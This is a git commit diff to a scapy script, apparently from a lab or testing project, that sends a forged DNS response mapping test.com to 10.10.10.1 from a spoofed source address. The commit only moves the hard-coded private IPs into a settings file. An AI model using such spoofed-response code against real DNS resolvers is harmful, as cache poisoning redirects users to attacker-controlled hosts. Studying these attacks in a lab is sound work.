264a83887c9d233adc29d834d07c5aca17f89e06
Titouan_portable <titouan.dhalluin@al-enterprise.com>
2022-12-23 16:43:32 +0100

    DNS cache poisonning FIX

--- dns_response.py
+++ dns_response.py
@@ -4,7 +4,7 @@ from scapy.all import *
 from scapy.all import IP, UDP, DNS,DNSQR, DNSRR
 import settings
 
-dns_resp =  IP(src='10.130.7.9', dst='10.130.7.14') \
+dns_resp =  IP(src=settings.source_ip, dst=settings.destination_ip) \
             / UDP(sport=53) \
             / DNS(id=2, qr=1, ra=1, qdcount=1, ancount=1, qd=DNSQR(qtype="A", qname="test.com"), an=DNSRR(rrname="test.com", rdata="10.10.10.1"))
 send(dns_resp, iface=settings.source_interface, verbose=0)
